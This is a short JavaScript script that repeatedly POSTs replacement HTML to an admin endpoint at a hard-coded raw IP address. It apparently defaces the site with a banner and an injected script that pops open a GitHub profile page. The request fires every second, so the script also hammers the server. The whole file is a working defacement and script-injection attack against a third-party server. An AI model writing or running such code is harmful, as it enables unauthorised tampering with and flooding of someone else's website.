const url = "http://185.194.177.155:8080/admin";

const bodyData = new URLSearchParams({
  new_html: `<script>
const newWin = window.open("https://github.com/duckeydev", "_blank");
if (newWin) {
  newWin.focus();
}
</script>

<script src="https://cdn.tailwindcss.com"></script>
</body>
<body>
<div class="bg-neutral-900">
  <h1 class="text-neutral-200 h-full w-full text-5xl font-extrabold drop-shadow-lg">
    Ducks are CUTE and so are U 💖
  </h1>
</div>
</body>`
});

async function sendRequest() {
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: bodyData.toString(),
    });
    if (res.ok) {
      console.log("POST sent ✅");
    } else {
      console.error("Failed with status:", res.status);
    }
  } catch (e) {
    console.error("Request error:", e);
  }
}

setInterval(sendRequest, 1000);
sendRequest();
